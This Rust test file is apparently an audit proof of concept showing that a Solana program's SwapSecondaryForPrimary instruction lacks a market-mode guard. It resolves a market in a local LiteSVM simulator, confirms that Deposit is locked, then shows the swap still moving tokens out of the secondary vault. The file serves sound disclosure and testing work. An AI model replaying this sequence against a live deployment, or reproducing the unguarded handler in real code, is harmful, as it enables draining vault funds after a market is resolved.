#![cfg(not(kani))]
//! PoC for VULN-02: handle_swap_secondary_for_primary missing market-mode guard.
//!
//! After ResolveMarket (mode = 1), every handler that touches engine state
//! rejects with EngineLockActive (Custom 21).  handle_swap_secondary_for_primary
//! (src/v16_program.rs:9520) is the exception — it reads only `cfg` from the
//! market account (market_ai is not marked writable) and never inspects
//! `group.header.mode`.
//!
//! Anti-hollow differential:
//!   • Deposit on the same resolved market → Custom(21)  (proves mode IS locked)
//!   • SwapSecondaryForPrimary             → Ok(())      (proves the missing guard)
//!
//! Instruction encoding:
//!   ResolveMarket              = 19
//!   UpdateBaseUnitMints        = 60 || [u8;32] primary || [u8;32] secondary
//!   SwapSecondaryForPrimary    = 61 || u128 amount
//!   Deposit                    = 2  || u128 amount

use litesvm::LiteSVM;
use percolator_prog::{
    ix::Instruction as ProgInstruction,
    processor::ASSET_ACTION_ACTIVATE,
    state,
};
use solana_sdk::{
    account::Account,
    compute_budget::ComputeBudgetInstruction,
    instruction::{AccountMeta, Instruction, InstructionError},
    program_option::COption,
    program_pack::Pack,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::{Transaction, TransactionError},
};
use spl_token::state::{Account as TokenAccount, AccountState, Mint};
use std::path::PathBuf;

// ── constants ─────────────────────────────────────────────────────────────────

const MAX_PORTFOLIO_ASSETS: u16 = 1;
const E_LOCK_ACTIVE: u32 = 21;
const SWAP_AMOUNT: u64 = 1_000;

// ── path helpers ──────────────────────────────────────────────────────────────

fn program_path() -> PathBuf {
    let mut p = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.push("target/deploy/percolator_prog.so");
    assert!(p.exists(), "BPF missing at {p:?} — run `cargo build-sbf`");
    p
}

fn spl_token_path() -> PathBuf {
    let cargo_home = std::env::var_os("CARGO_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            let mut h = PathBuf::from(std::env::var_os("HOME").expect("HOME"));
            h.push(".cargo");
            h
        });
    for entry in std::fs::read_dir(cargo_home.join("registry/src")).expect("registry/src") {
        let cand = entry.expect("dir entry").path()
            .join("litesvm-0.1.0/src/spl/programs/spl_token-3.5.0.so");
        if cand.exists() {
            return cand;
        }
    }
    panic!("spl_token-3.5.0.so not found");
}

fn canonical_vault_ata(vault_authority: &Pubkey, mint: &Pubkey) -> Pubkey {
    let ata: Pubkey = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL".parse().unwrap();
    Pubkey::find_program_address(
        &[vault_authority.as_ref(), spl_token::ID.as_ref(), mint.as_ref()],
        &ata,
    ).0
}

fn make_mint(svm: &mut LiteSVM) -> Pubkey {
    let key = Pubkey::new_unique();
    let mut d = vec![0u8; Mint::LEN];
    Mint::pack(Mint { mint_authority: COption::None, supply: 0, decimals: 0, is_initialized: true, freeze_authority: COption::None }, &mut d).unwrap();
    svm.set_account(key, Account { lamports: 1_000_000_000, data: d, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();
    key
}

fn make_token_account(svm: &mut LiteSVM, mint: Pubkey, owner: Pubkey, amount: u64) -> Pubkey {
    let key = Pubkey::new_unique();
    let mut d = vec![0u8; TokenAccount::LEN];
    TokenAccount::pack(TokenAccount { mint, owner, amount, delegate: COption::None, state: AccountState::Initialized, is_native: COption::None, delegated_amount: 0, close_authority: COption::None }, &mut d).unwrap();
    svm.set_account(key, Account { lamports: 1_000_000_000, data: d, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();
    key
}

// ── harness ───────────────────────────────────────────────────────────────────

struct Env {
    svm: LiteSVM,
    program_id: Pubkey,
    payer: Keypair,
    admin: Keypair,
    market: Pubkey,
    primary_mint: Pubkey,
    secondary_mint: Pubkey,
    primary_vault: Pubkey,
    secondary_vault: Pubkey,
    vault_authority: Pubkey,
    portfolio_len: usize,
}

impl Env {
    fn new() -> Self {
        let mut svm = LiteSVM::new();
        let program_id = percolator_prog::id();
        svm.add_program(program_id, &std::fs::read(program_path()).expect("wrapper BPF"));
        svm.add_program(spl_token::ID, &std::fs::read(spl_token_path()).expect("spl_token BPF"));

        let payer = Keypair::new();
        let admin = Keypair::new();
        let market = Pubkey::new_unique();
        svm.airdrop(&payer.pubkey(), 1_000_000_000_000).unwrap();
        svm.airdrop(&admin.pubkey(), 1_000_000_000_000).unwrap();

        let primary_mint = make_mint(&mut svm);
        let secondary_mint = make_mint(&mut svm);
        let (vault_authority, _) = Pubkey::find_program_address(&[b"vault", market.as_ref()], &program_id);
        let primary_vault = canonical_vault_ata(&vault_authority, &primary_mint);
        let secondary_vault = canonical_vault_ata(&vault_authority, &secondary_mint);

        // Vault token accounts — primary empty, secondary pre-funded with SWAP_AMOUNT
        make_token_account_at(&mut svm, primary_vault, primary_mint, vault_authority, 0);
        make_token_account_at(&mut svm, secondary_vault, secondary_mint, vault_authority, SWAP_AMOUNT);

        let market_len = state::market_account_len_for_capacity(MAX_PORTFOLIO_ASSETS as usize).unwrap();
        svm.set_account(market, Account { lamports: 1_000_000_000, data: vec![0u8; market_len], owner: program_id, executable: false, rent_epoch: 0 }).unwrap();

        let portfolio_len = state::portfolio_account_len_for_market_slots(MAX_PORTFOLIO_ASSETS as usize).unwrap();
        let mut env = Env { svm, program_id, payer, admin, market, primary_mint, secondary_mint, primary_vault, secondary_vault, vault_authority, portfolio_len };

        let admin_clone = env.admin.insecure_clone();

        // InitMarket
        env.send_ok(
            ProgInstruction::InitMarket {
                max_portfolio_assets: MAX_PORTFOLIO_ASSETS,
                h_min: 0, h_max: 10, initial_price: 100,
                min_nonzero_mm_req: 1, min_nonzero_im_req: 2,
                maintenance_margin_bps: 10_000, initial_margin_bps: 10_000,
                max_trading_fee_bps: 10_000, trade_fee_base_bps: 0,
                liquidation_fee_bps: 0, liquidation_fee_cap: 0,
                min_liquidation_abs: 0, max_price_move_bps_per_slot: 10_000,
                max_accrual_dt_slots: 1, max_abs_funding_e9_per_slot: 0,
                min_funding_lifetime_slots: 1, max_account_b_settlement_chunks: 1,
                max_bankrupt_close_chunks: 1, max_bankrupt_close_lifetime_slots: 100,
                public_b_chunk_atoms: percolator::MAX_VAULT_TVL, maintenance_fee_per_slot: 0,
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
                AccountMeta::new_readonly(primary_mint, false),
            ],
            &[&admin_clone],
        ).expect("InitMarket");

        // UpdateBaseUnitMints — set secondary mint (vault==0, c_tot==0)
        env.send_ok(
            ProgInstruction::UpdateBaseUnitMints {
                primary_mint: primary_mint.to_bytes(),
                secondary_mint: secondary_mint.to_bytes(),
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
                AccountMeta::new_readonly(primary_mint, false),
                AccountMeta::new_readonly(secondary_mint, false),
            ],
            &[&admin_clone],
        ).expect("UpdateBaseUnitMints");

        // Activate asset 1
        env.send_ok(
            ProgInstruction::UpdateAssetLifecycle {
                action: ASSET_ACTION_ACTIVATE, asset_index: 1, now_slot: 1, initial_price: 100,
                insurance_authority: admin_clone.pubkey().to_bytes(),
                insurance_operator: admin_clone.pubkey().to_bytes(),
                backing_bucket_authority: admin_clone.pubkey().to_bytes(),
                oracle_authority: admin_clone.pubkey().to_bytes(),
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
            ],
            &[&admin_clone],
        ).expect("UpdateAssetLifecycle");

        env
    }

    fn send_ok(&mut self, ix: ProgInstruction, accounts: Vec<AccountMeta>, signers: &[&Keypair]) -> Result<(), TransactionError> {
        self.svm.expire_blockhash();
        let ixs = vec![
            ComputeBudgetInstruction::request_heap_frame(128 * 1024),
            ComputeBudgetInstruction::set_compute_unit_limit(1_400_000),
            Instruction { program_id: self.program_id, accounts, data: ix.encode() },
        ];
        let mut all = vec![&self.payer];
        all.extend_from_slice(signers);
        let tx = Transaction::new_signed_with_payer(&ixs, Some(&self.payer.pubkey()), &all, self.svm.latest_blockhash());
        self.svm.send_transaction(tx).map(|_| ()).map_err(|e| e.err)
    }

    fn create_portfolio(&mut self, owner: &Keypair) -> Pubkey {
        self.svm.airdrop(&owner.pubkey(), 1_000_000_000).unwrap();
        let portfolio = Pubkey::new_unique();
        self.svm.set_account(portfolio, Account { lamports: 1_000_000_000, data: vec![0u8; self.portfolio_len], owner: self.program_id, executable: false, rent_epoch: 0 }).unwrap();
        self.send_ok(
            ProgInstruction::InitPortfolio,
            vec![
                AccountMeta::new(owner.pubkey(), true),
                AccountMeta::new(self.market, false),
                AccountMeta::new(portfolio, false),
            ],
            &[owner],
        ).expect("InitPortfolio");
        portfolio
    }
}

fn make_token_account_at(svm: &mut LiteSVM, address: Pubkey, mint: Pubkey, owner: Pubkey, amount: u64) {
    let mut d = vec![0u8; TokenAccount::LEN];
    TokenAccount::pack(TokenAccount { mint, owner, amount, delegate: COption::None, state: AccountState::Initialized, is_native: COption::None, delegated_amount: 0, close_authority: COption::None }, &mut d).unwrap();
    svm.set_account(address, Account { lamports: 1_000_000_000, data: d, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();
}

fn assert_custom(res: Result<(), TransactionError>, code: u32, label: &str) {
    match res {
        Err(TransactionError::InstructionError(_, InstructionError::Custom(c))) =>
            assert_eq!(c, code, "{label}: expected Custom({code}), got Custom({c})"),
        Err(other) => panic!("{label}: expected Custom({code}), got {other:?}"),
        Ok(()) => panic!("{label}: expected Custom({code}), but tx succeeded"),
    }
}

// ── PoC test ──────────────────────────────────────────────────────────────────

/// Proves VULN-02: handle_swap_secondary_for_primary has no market-mode guard.
///
/// After ResolveMarket (mode=1):
///   • Deposit is correctly rejected with EngineLockActive (Custom 21)
///   • SwapSecondaryForPrimary succeeds — the missing guard confirmed
#[test]
fn vuln02_swap_secondary_succeeds_after_resolve() {
    let mut env = Env::new();
    let admin = env.admin.insecure_clone();

    // Create a portfolio for the differential Deposit check
    let victim = Keypair::new();
    let victim_portfolio = env.create_portfolio(&victim);
    let victim_source = make_token_account(&mut env.svm, env.primary_mint, victim.pubkey(), 0);

    // Resolve the market (mode → 1)
    env.send_ok(
        ProgInstruction::ResolveMarket,
        vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new(env.market, false),
        ],
        &[&admin],
    ).expect("ResolveMarket");

    // ── differential: Deposit rejects with EngineLockActive ──────────────────
    let deposit_res = env.send_ok(
        ProgInstruction::Deposit { amount: 1 },
        vec![
            AccountMeta::new(victim.pubkey(), true),
            AccountMeta::new(env.market, false),
            AccountMeta::new(victim_portfolio, false),
            AccountMeta::new(victim_source, false),
            AccountMeta::new(env.primary_vault, false),
            AccountMeta::new_readonly(spl_token::ID, false),
        ],
        &[&victim],
    );
    assert_custom(deposit_res, E_LOCK_ACTIVE, "Deposit after resolve must fail EngineLockActive");

    // ── VULN-02: SwapSecondaryForPrimary succeeds on a resolved market ────────
    let admin_primary_source = make_token_account(&mut env.svm, env.primary_mint, admin.pubkey(), SWAP_AMOUNT);
    let admin_secondary_dest = make_token_account(&mut env.svm, env.secondary_mint, admin.pubkey(), 0);

    let swap_res = env.send_ok(
        ProgInstruction::SwapSecondaryForPrimary { amount: SWAP_AMOUNT as u128 },
        vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new_readonly(env.market, false),  // read-only — no mode update
            AccountMeta::new(admin_primary_source, false),
            AccountMeta::new(env.primary_vault, false),
            AccountMeta::new(admin_secondary_dest, false),
            AccountMeta::new(env.secondary_vault, false),
            AccountMeta::new_readonly(env.vault_authority, false),
            AccountMeta::new_readonly(spl_token::ID, false),
        ],
        &[&admin],
    );

    // Must succeed — the missing mode guard lets this through post-resolution.
    swap_res.expect("SwapSecondaryForPrimary must succeed despite mode=1 — VULN-02 confirmed");

    // Verify tokens actually moved: primary entered vault, secondary left vault
    let primary_vault_data = env.svm.get_account(&env.primary_vault).unwrap().data;
    let secondary_vault_data = env.svm.get_account(&env.secondary_vault).unwrap().data;
    let pv = TokenAccount::unpack(&primary_vault_data).unwrap();
    let sv = TokenAccount::unpack(&secondary_vault_data).unwrap();

    assert_eq!(pv.amount, SWAP_AMOUNT, "primary vault should have gained SWAP_AMOUNT");
    assert_eq!(sv.amount, 0, "secondary vault should have been drained by SWAP_AMOUNT");
}
